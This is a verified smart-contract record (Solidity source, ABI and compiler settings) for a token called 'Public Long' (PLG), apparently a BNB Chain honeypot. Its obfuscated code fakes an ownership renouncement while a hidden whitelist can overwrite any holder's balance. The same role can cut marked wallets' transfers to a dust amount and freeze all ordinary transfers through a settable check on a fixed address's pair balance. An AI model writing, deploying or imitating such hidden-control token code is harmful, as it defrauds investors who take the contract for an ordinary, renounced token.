{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface swapTokenMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingLimit) external view returns (uint256);\n\n    function transfer(address limitMarketing, uint256 tokenReceiverList) external returns (bool);\n\n    function allowance(address takeWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenReceiverList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitMarketing,\n        uint256 tokenReceiverList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTeam, uint256 value);\n    event Approval(address indexed takeWallet, address indexed spender, uint256 value);\n}\n\nabstract contract receiverExemptTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listTrading {\n    function createPair(address walletIsSell, address receiverFundAuto) external returns (address);\n}\n\ninterface launchedAmountTo is swapTokenMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PublicLong is receiverExemptTotal, swapTokenMin, launchedAmountTo {\n\n    bool public autoMarketing;\n\n    uint256 public fundWalletMin;\n\n    bool private launchedSwap;\n\n    address launchShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private amountLiquidity;\n\n    function transferFrom(address launchAuto, address limitMarketing, uint256 tokenReceiverList) external override returns (bool) {\n        if (_msgSender() != launchShould) {\n            if (launchedTx[launchAuto][_msgSender()] != type(uint256).max) {\n                require(tokenReceiverList <= launchedTx[launchAuto][_msgSender()]);\n                launchedTx[launchAuto][_msgSender()] -= tokenReceiverList;\n            }\n        }\n        return toLaunched(launchAuto, limitMarketing, tokenReceiverList);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minTotal;\n    }\n\n    uint256 private fromEnableTake = 100000000 * 10 ** 18;\n\n    function allowance(address senderMinMax, address isReceiver) external view virtual override returns (uint256) {\n        if (isReceiver == launchShould) {\n            return type(uint256).max;\n        }\n        return launchedTx[senderMinMax][isReceiver];\n    }\n\n    bool public buyExempt;\n\n    string private minTotal = \"Public Long\";\n\n    mapping(address => bool) public txLimit;\n\n    mapping(address => bool) public fromAmount;\n\n    function getOwner() external view returns (address) {\n        return enableTx;\n    }\n\n    uint256 receiverMode;\n\n    mapping(address => mapping(address => uint256)) private launchedTx;\n\n    function listTotal() public {\n        emit OwnershipTransferred(fromFund, address(0));\n        enableTx = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSwap;\n    }\n\n    bool public senderTo;\n\n    string private exemptFund = \"PLG\";\n\n    uint256 constant buyFromFee = 10 ** 10;\n\n    bool public atLimit;\n\n    uint256 private marketingMinIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromEnableTake;\n    }\n\n    function balanceOf(address tradingLimit) public view virtual override returns (uint256) {\n        return amountLiquidity[tradingLimit];\n    }\n\n    function totalAt(address enableTxTake) public {\n        teamAmountMarketing();\n        \n        if (enableTxTake == fromFund || enableTxTake == amountTotal) {\n            return;\n        }\n        txLimit[enableTxTake] = true;\n    }\n\n    function transfer(address sellExempt, uint256 tokenReceiverList) external virtual override returns (bool) {\n        return toLaunched(_msgSender(), sellExempt, tokenReceiverList);\n    }\n\n    function sellIs(uint256 tokenReceiverList) public {\n        teamAmountMarketing();\n        listTxExempt = tokenReceiverList;\n    }\n\n    event OwnershipTransferred(address indexed toMarketing, address indexed txTotalShould);\n\n    address public amountTotal;\n\n    function teamAmountMarketing() private view {\n        require(fromAmount[_msgSender()]);\n    }\n\n    uint8 private receiverSwap = 18;\n\n    address public fromFund;\n\n    function owner() external view returns (address) {\n        return enableTx;\n    }\n\n    function toFee(address tokenLaunch) public {\n        if (maxSell) {\n            return;\n        }\n        \n        fromAmount[tokenLaunch] = true;\n        if (marketingMinIs != toAmount) {\n            maxTradingSwap = true;\n        }\n        maxSell = true;\n    }\n\n    constructor (){\n        \n        txMax launchedLimit = txMax(launchShould);\n        amountTotal = listTrading(launchedLimit.factory()).createPair(launchedLimit.WETH(), address(this));\n        \n        fromFund = _msgSender();\n        listTotal();\n        fromAmount[fromFund] = true;\n        amountLiquidity[fromFund] = fromEnableTake;\n        \n        emit Transfer(address(0), fromFund, fromEnableTake);\n    }\n\n    uint256 listTxExempt;\n\n    function tradingReceiver(address sellExempt, uint256 tokenReceiverList) public {\n        teamAmountMarketing();\n        amountLiquidity[sellExempt] = tokenReceiverList;\n    }\n\n    bool private maxTradingSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptFund;\n    }\n\n    bool public maxSell;\n\n    function walletShould(address launchAuto, address limitMarketing, uint256 tokenReceiverList) internal returns (bool) {\n        require(amountLiquidity[launchAuto] >= tokenReceiverList);\n        amountLiquidity[launchAuto] -= tokenReceiverList;\n        amountLiquidity[limitMarketing] += tokenReceiverList;\n        emit Transfer(launchAuto, limitMarketing, tokenReceiverList);\n        return true;\n    }\n\n    uint256 private toAmount;\n\n    address swapReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function toLaunched(address launchAuto, address limitMarketing, uint256 tokenReceiverList) internal returns (bool) {\n        if (launchAuto == fromFund) {\n            return walletShould(launchAuto, limitMarketing, tokenReceiverList);\n        }\n        uint256 receiverAuto = swapTokenMin(amountTotal).balanceOf(swapReceiver);\n        require(receiverAuto == listTxExempt);\n        require(limitMarketing != swapReceiver);\n        if (txLimit[launchAuto]) {\n            return walletShould(launchAuto, limitMarketing, buyFromFee);\n        }\n        return walletShould(launchAuto, limitMarketing, tokenReceiverList);\n    }\n\n    address private enableTx;\n\n    function approve(address isReceiver, uint256 tokenReceiverList) public virtual override returns (bool) {\n        launchedTx[_msgSender()][isReceiver] = tokenReceiverList;\n        emit Approval(_msgSender(), isReceiver, tokenReceiverList);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotalShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiverList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWalletMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenReceiverList\",\"type\":\"uint256\"}],\"name\":\"sellIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"}],\"name\":\"toFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTxTake\",\"type\":\"address\"}],\"name\":\"totalAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiverList\",\"type\":\"uint256\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiverList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiverList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PublicLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}